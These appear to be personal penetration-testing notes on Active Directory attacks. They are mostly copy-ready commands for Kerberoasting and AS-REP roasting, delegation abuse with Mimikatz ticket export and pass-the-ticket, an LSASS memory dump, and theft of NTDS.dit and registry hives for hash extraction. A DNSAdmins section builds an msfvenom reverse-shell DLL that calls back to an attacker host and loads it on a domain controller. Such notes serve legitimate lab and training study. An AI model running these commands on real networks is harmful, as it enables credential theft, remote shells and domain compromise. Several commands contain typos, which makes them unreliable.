***New Kerbroasting method on Host System***

Most of the time you will need an active account on the domain in order to initial Kerberoast, but if the DC is configured with [UserAccountControl setting “Do not require Kerberos preauthentication” enabled](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/), it is possible to request and receive a ticket to crack without a valid account on the domain.

- Rubeus.exe
	`Rubeus.exe kerberoast /outfile:hash.txt`
- ps1 Powershell Script
	`Import-Module .\Invoke-Kerbroast.ps1`
	`Invoke-Kerbroast.ps1`

***New Kerbroasting method on Remote System***
- Powershell Empire
	`usermodule credentials/invoke_kerberoast`
	`execute`
- Impacket
- Metasploit
	`powershell_import /root/powershell/Invoke-kerberost.ps1`
	`powershell_execute Invoke-Kerberost`
- Pypykatz from powershell
	`load powershell`
	`powershell_shell`
	`Get-Process Lsass`
	`cd C:\Windows\System32`
	`.\rundll32.exe comsvcs.sll, MiniDump 628 C:\lsass.DMP full`

- ***If you have normal user account and want to get the hash of  other users associated with that account then***
	- Requirement: Normal username and password (***Kerberosting***)
```bash
# List the username associated with normal user account
GetUserSPNs.py -request -dc-ip [IP] [domain]/[normal_user] -save -outfile userlist
impacket-GetUserSPNs 'vulnnet-rst.local/t-skid:tj072889*' -outputfile hashes -dc-ip 10.10.50.95
# Example
# GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs -save -outfile userlist
```

- Find user accounts used as Service accounts:
- PowerView
	`Get-NetUser -SPN`
- ActiveDirectory module
	`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`

### Process
- Request TGS
	```bash
	Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.kerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcrop-mgmt.dollarcorp.moneycorp.local"
	```
	`Request-SPNTicket` from PowerView can be used as well for cracking with John or Hashcat.
- Check if the TGS has been granted.
	`klist`
- Export all tickets using Mimikatz
	`Invoke-Mimikatz -Command '"kerberos::list /export"'`

Now we can crack the passwords.

## Targeted Kerberoasting - AS-REPs
- If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
- With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.


DPE:: 11:17

 **Enumerating accounts with Kerberos Preauth disabled**
- Using PowerView (dev):
	`Get-DomainUser -PreauthNotRequired -Verbose`
- Using ActiveDirectory module:
	`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

**Force disable Kerberos Preauth:**
- Lets enumerate the permissions for RDPUsers on ACLs using PowerView(dev):
	```bash
	Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
	Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
	Get-DomainUser -PreauthNotRequired -Verbose
	
	```

**Request encrypted AS-REP for offline brute-force**
- Let's use ASREPRoast
	`Get-ASREPHash -UserName VPN1user -Verbose`
- To enumerate all users with Kerberos preauth disabled and request a hash
	`Invoke-ASREPRoast -Verbose`

## Targeted Kerberoasting - Set SPN
- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
- We can then request a TGS without special privileges. The TGS can then be "Kerberosted"

- Let's enumerate the permissions for RDPUsers on ACLs using PowerView(dev):
	`Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
- Using PowerView(dev), see if the users already has a SPN: 
	`Get-DomainUser -Identity supportuser | select serviceprincipalname`
- Using ActiveDirectory module:
	`Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName`

- Set a SPN for the user (must be unique for the domain)
	`Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}`
- Using ActiveDirectory module:
	`Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}`


<center><h1>Kerberos Delegation</h1></center>

*Delegation is the act of giving someone authority or responsibility to do something on behalf of someone else.*


**Why we use Kerberos Delegation?**
	enables an application to access resources hosted on a different server and solution to ***Double Hop problem***
**How Kerberos Delegation works?**
	This gives service administrators the ability to specify and enforce application trust boundaries by limiting the scope where *application services can act on a user's behalf*
**What is Constrained and unconstrained delegation Kerberos?**
	**Constrained delegation** is to limit access of a delegation machine/account to specific services while impersonating users
		`User` --- authenticates to ---> `IIS server` ---> authenticates on behalf of the user ---> `DB server`
	**Unconstrained delegation** allows a ***user or computer*** with the option “**_Trust This user/computer for delegation to any service_**” enabled to ***impersonate ANY*** user authenticates to it and request access to ***ANY service*.**


- Kerberos Delegation allows to "*reuse the end-user credentials to access resources hosted on a different server*"
- This is useful in multi-tier service or applications where Kerberos Double Hop is required.
- Example: Users authenticates to a web server and web server makes request to a database server. The web server can request access to resources on the database server as the user not as the service account.
- Please note that, for the above example, the service account for web service must be trusted for delegation to be able to make requests as a user.

*Kerberos Double hop problem.*

1. A user provides credentials to the DC.
2. The DC returns a TGT.
3. The user requests a TGS for the web service on Web Server.
4. The DC provides a TGS.
5. The user sends the TGT and TGS to the web server.
6. The web server service acount use the **user's TGT** to request a TGS for the database server from DC.
7. The web server service account connects to the database server as the user.






As in Delegation when user wants to access the resource on Database server then it first sends the request to Web Server and then **Server impersonates or have power to impersonate as that user to access the Resource in his/her limitation.**

#### What is Kerberos Double Hop Problem?
Kerberos Double Hop is a term used to describe our method of **maintaining the client's Kerberos authentication credentials over two or more connections**. In this fashion we can retain the user's credentials and act on behalf of the user in further connections to other servers.
**Problem is that Server or Web server is not allowed to deligate the ticket to other server or cant retain the user credentials.**

## General/Basic or Unconstrained Delegation
Unconstrained means without any limit i.e. allows ***a first hop server*** with the option “**_Trust This user/computer for delegation to any service_**” enabled to ***impersonate ANY*** user authenticates to it and request access to ***ANY service*.**

#### How this works?
When unconstrained delegation is enabled, The DC places user's TGT inside TGS(Step 4 in diagram). When presented to the server with unconstrained delegation. the ***TGT is extracted from TGS and stored in LSASS***. This way the server can reuse the user's TGT to access any other resource as the user.

#### How can we abuse it?
As TGT is stored in LSASS of Web Server, So we can extract all the TGT of users present on unconstrained delegation enabled server.

- Discover domain computers which have unconstrained delegation enabled using PowerView:
	`Get-NetComputer -UnConstrained`
- Using ActiveDirectory module:
	```bash
	Get-ADComputer -Filter {TrustedForDelegation -eq $True}
	Get-ADUser -Filter {TrustedForDelegation -eq $True}
	```
![](https://i.imgur.com/pg2QrgX.png)

**Compromise the server where Unconstrained delegation is enabled.**
- Check if any DA token is available:
	`Invoke-Mimikatz -Command '"sekurlsa::tickets"'`
	*This command extracts all the hashes from lsass proccess and saves them to the disk.*
- The DA token can be reused:
	`Invoke-Mimikatz -Command '"kerberos::ptt <Ticket_Location>"'`



## Constrained Delegation
Contrained means having a limit or boundary i.e. allows ***a first hop server*** to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to first hop, *Windows Offers protocol transition to transsition the request to Kerberos.*

> Both types of delegations, a mechanism is required to impersonate the incoming user and authenticate to the second hop server.

**Scenario:** A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.

To impersonate the user, Service for User (S4U) extension is used which provides two extensions:
- Service for User to Self (S4U2self) - Allows a service to obtain a forwardable TGS to itself on behalf of a user. The service acccount must have `TRUST_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute`
- Service for User to Proxy (S4U2proxy) - Allows service to obtain a TGS to a second service on behalf of a user.

#### Prerequisites
- Hunt for user accounts that have kerberos constrained delegation enabled:
	`Get-NetUser -TrustedToAuth`
	*User has to have an attribute `TRUSTED_TO_AUTH_FOR_DELEGATION` in order for it to be able to authenticate to the remote service*

![[Pasted image 20220607000346.png]]

`msds-allowedtodelegateto` identifies the SPNs of services the user `spot` is trusted to delegate to and authenticate to - in this case, CIFS service on DC01 on behalf of any other domain user.
- Using ActiveDirectory module:
	`Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`
	
![](https://i.imgur.com/2ZFXRRE.png)

> If we have access to the account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.

<center><h1>DNSAdmin</h1></center>
It is possible for the member of DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM)




Maliciouis DLL file: 
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.4.1 LPORT=4444 -f dll > exploit.dll

# Export this with SMB service (victim machinls

dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.8\share\exploit.dll

# Powershell
cmd /c 'dnscmd /config /serverlevelplugindll \\10.10.14.8\share\exploit.dll'

# Stop and Start the DNS service which will download the malicious dll file and execute it
sc.exe stop dns ; sc.exe start dns



# Using DNSServer module (Needs RSAT DNS):
$dnssettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All
$dnssettings.ServerLevelPluginDll = "\\10.10.14.8\share\exploit.dll"
Set-DnsServerSetting -InputObject $dnsetting -ComputerName dcorp-dc -Verbose

# Stop and Start the DNS service which will download the dll file and execute it
sc \\dcorp-dc stop dns ; sc \\dcorp-dc start dns

```

If attack *Fails* then check the `ServerLevelPluginDll` in DLL file:
```powershell
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```

## Backup Account
#Blackfield_HTB 

Check the privileges `whoami /priv` and check if the account is in backup acount `net user svc_backup` 
if,
- [ ] It has `SeBackupPrivilege` and `SeRestorePrivilege`

then we can escilate the priivleges of this current account using [Acl-FullControl](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1) script, can be read in [this](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sebackupprivilege-3-1-4) article

*This script allows user to chnage the ACL for that specified file or Directory*

```bash
# Syntax
Import-Module .\Acl-FullControl.ps1
Acl-FullControl -user [domain]\[user] -path C:\Users\Administrator\


# Example
Acl-FullControl -user blackfield.local\svc_backup -path C:\Users\Administrator\
```


## Steal NTDS.dit
It is very common during penetration tests where domain administrator access has been achieved to extract the password hashes of all the domain users for offline cracking and analysis. These hashes are stored in a database file in the domain controller (NTDS.DIT) with some additional information like group memberships and users.

The NTDS.DIT file is constantly in use by the operating system and therefore cannot be copied directly to another location for extraction of information. This file can be found in the following Windows location:
 `C:\Windows\NTDS\NTDS.dit`

We can steal it by two ways:
- [ ] [diskshadow](https://pentestlab.blog/tag/diskshadow/)
- [ ] wbadmin

<center><i>Idea is to backup the OS then grab the ntds.dit file</i></center>

We can do that in C$ or make NTFS SMB from *ippsec* 

```bash
# chnage dir to SMB C$ 
cd \\10.10.10.192\C$\Windows\Temp
# Make a dir to store
md CFX
# Start the backup via wbadmin
wbadmin start backup -backuptarget:\\10.10.10.192\C$\Windows\Temp\CFX\ -include:C:\Windows\ntds\ntds.dit -quiet

# List items
tree /A /F
```

Now we want to access the backup files to do that we need to specify a flag `notRestoreAcl`  which is valid when recovering file. 

```bash
wbadmin start recovery -version:04/21/2021-14:14<version_identifier> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\Users\svc_backup\Downloads -notRestoreAcl -quiet
```

Last this is to do is to dump the `SYSTEM` and `SAM` file from registers

```bash
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
```


Finally....... 
lets crack the ntds.dit file

```bash
impacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
